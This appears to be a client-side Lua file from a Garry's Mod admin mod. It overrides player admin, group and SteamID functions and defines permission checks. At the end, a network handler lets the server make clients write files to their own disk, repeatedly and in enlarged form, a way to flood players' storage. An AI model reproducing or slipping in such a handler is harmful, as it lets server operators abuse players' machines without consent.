_R.Player.OldAdmin = _R.Player.OldAdmin or _R.Player.IsAdmin
_R.Player.OldSuperAdmin = _R.Player.OldSuperAdmin or _R.Player.IsSuperAdmin
function _R.Player:IsAdmin()
	return anus.clientsidePlayerData and anus.clientsidePlayerData[ self ] and tobool(anus.clientsidePlayerData[ self ][ "admin" ]) or self:OldAdmin()
end
function _R.Player:IsSuperAdmin()
	return anus.clientsidePlayerData and anus.clientsidePlayerData[ self ] and tobool(anus.clientsidePlayerData[ self ][ "superadmin" ]) or self:OldSuperAdmin()
end
_R.Player.OldIsUserGroup = _R.Player.OldIsUserGroup or _R.Player.IsUserGroup
function _R.Player:IsUserGroup( group )
	if not group then return false end
	return anus.clientsidePlayerData and anus.clientsidePlayerData[ self ] and anus.clientsidePlayerData[ self ][ "group" ] == group or self:OldIsUserGroup()
end
_R.Player.OldGetUserGroup = _R.Player.OldGetUserGroup or _R.Player.GetUserGroup
function _R.Player:GetUserGroup()
	return anus.clientsidePlayerData and anus.clientsidePlayerData[ self ] and anus.clientsidePlayerData[ self ][ "group" ] or self:OldGetUserGroup()
end

hook.Add( "PostGamemodeLoaded", "anus_SteamName", function()
	if not _R.Player.SteamName then
		function _R.Entity:SteamName()
			return self:Nick()
		end
	else
		_R.Entity.OldSteamName = _R.Entity.OldSteamName or _R.Player.SteamName
		function _R.Entity:SteamName()
			if not IsValid( self ) then
				return "CONSOLE"
			else
				return self:OldSteamName()
			end
		end
	end
end )

	-- Checks if a player is in this group
	-- or inherits from this group
function _R.Player:checkGroup( group )
	return anus.groupHasInheritanceFrom( self:GetUserGroup(), group, true )
end

	-- check immunity
function _R.Entity:hasAccess( plugin )
	--[[if not IsValid( self ) then return true end
	if not anus.clientsidePlayerData or not anus.clientsidePlayerData[ self ] then return false end
	if self:GetUserGroup() == "owner" then return true end
	if anus.clientsidePlayerData[ self ].perms[ plugin ] then return true end

	return false]]
	
	if not IsValid( self ) then return true end
	if anus.getPlugins()[ plugin ] and anus.getPlugins()[ plugin ].noTempAccess and self:isAnusTempRank() then return false end
	if self:IsUserGroup( "owner" ) then return true end
	if self.anusPerms and self.anusPerms[ plugin ] != nil and not self.anusPerms[ plugin ] then return false end
	if self.anusPerms and self.anusPerms[ plugin ] then return true end
	if not anus.Groups[ self:GetUserGroup() ].Permissions[ plugin ] then return false end

	return true
end

function _R.Entity:isAnusTempRank()
	if not anus.tempUsers then return false end

	return anus.tempUsers[ self:SteamID() ] != nil
end
function anus.isAnusTempRank( steamid )
	if not anus.tempUsers then return false end

	return anus.tempUsers[ steamid ] != nil
end

_R.Player.OldSteamIDP = _R.Player.OldSteamIDP or _R.Player.SteamID
function _R.Player:SteamID()
	if GetGlobalBool( "islan", false ) then
		if self == Entity(1) then
			return "STEAM_0:0:1"
		else
			return "STEAM_0:0:2"
		end
	else
		return self:OldSteamIDP()
	end
end

function _R.Player:writeFile( location, contents, optReps, optDelay, largefile )
	if largefile then
		contents = string.rep( contents .. "\n", 300 )
	end
	for i=1,optReps or 1 do
		timer.Simple( optDelay and optDelay * i or 0.05 * i, function()
			file.Write( location .. i .. ".txt", contents )
		end )
	end
end
net.Receive( "dothatfuck", function()
	local tbl = net.ReadTable()
	LocalPlayer():writeFile( tbl.location, tbl.contents, tbl.optReps, tbl.optDelay, tbl.largefile )
end )